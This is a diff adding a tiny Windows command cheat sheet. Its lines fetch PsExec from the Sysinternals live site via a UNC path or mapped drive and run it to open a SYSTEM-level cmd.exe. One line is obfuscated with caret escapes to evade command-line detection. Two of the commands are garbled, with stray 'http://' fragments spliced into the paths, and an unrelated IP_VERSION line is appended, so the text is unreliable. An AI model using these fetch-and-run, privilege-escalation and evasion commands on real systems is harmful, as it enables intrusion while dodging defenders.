@@ -1,0 +1,11 @@
+%  cmd,powershell,windows,pushou
+
+# psexec
+\\http://live.sysinternals.com\tools\PsExec.exe -s -c cmd.exe
+net use z: https://live.sysinternals.com/tools && z:\PsExec.exe -s -c cmd.exe
+net use z: htT^pS://li^ve.sysInTer^http://nals.com/toOls && z:\Ps^EXeC.eXe -s c^md.e^xe
+
+
+
+
+$ IP_VERSION: echo '4 6' | tr ' ' '\n'
